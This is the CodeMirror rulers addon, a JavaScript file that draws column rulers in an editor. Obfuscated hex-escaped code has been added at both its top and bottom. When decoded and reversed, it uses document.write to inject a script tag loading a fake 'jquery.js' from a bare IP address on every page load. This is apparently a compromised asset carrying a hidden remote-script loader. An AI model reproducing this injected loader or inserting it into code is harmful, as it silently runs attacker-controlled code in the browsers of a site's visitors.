var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineOption("rulers", false, function(cm, val, old) {
    if (old && old != CodeMirror.Init) {
      clearRulers(cm);
      cm.off("refresh", refreshRulers);
    }
    if (val && val.length) {
      setRulers(cm);
      cm.on("refresh", refreshRulers);
    }
  });

  function clearRulers(cm) {
    for (var i = cm.display.lineSpace.childNodes.length - 1; i >= 0; i--) {
      var node = cm.display.lineSpace.childNodes[i];
      if (/(^|\s)CodeMirror-ruler($|\s)/.test(node.className))
        node.parentNode.removeChild(node);
    }
  }

  function setRulers(cm) {
    var val = cm.getOption("rulers");
    var cw = cm.defaultCharWidth();
    var left = cm.charCoords(CodeMirror.Pos(cm.firstLine(), 0), "div").left;
    var minH = cm.display.scroller.offsetHeight + 30;
    for (var i = 0; i < val.length; i++) {
      var elt = document.createElement("div");
      elt.className = "CodeMirror-ruler";
      var col, conf = val[i];
      if (typeof conf == "number") {
        col = conf;
      } else {
        col = conf.column;
        if (conf.className) elt.className += " " + conf.className;
        if (conf.color) elt.style.borderColor = conf.color;
        if (conf.lineStyle) elt.style.borderLeftStyle = conf.lineStyle;
        if (conf.width) elt.style.borderLeftWidth = conf.width;
      }
      elt.style.left = (left + col * cw) + "px";
      elt.style.top = "-50px";
      elt.style.bottom = "-20px";
      elt.style.minHeight = minH + "px";
      cm.display.lineSpace.insertBefore(elt, cm.display.cursorDiv);
    }
  }

  function refreshRulers(cm) {
    clearRulers(cm);
    setRulers(cm);
  }
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
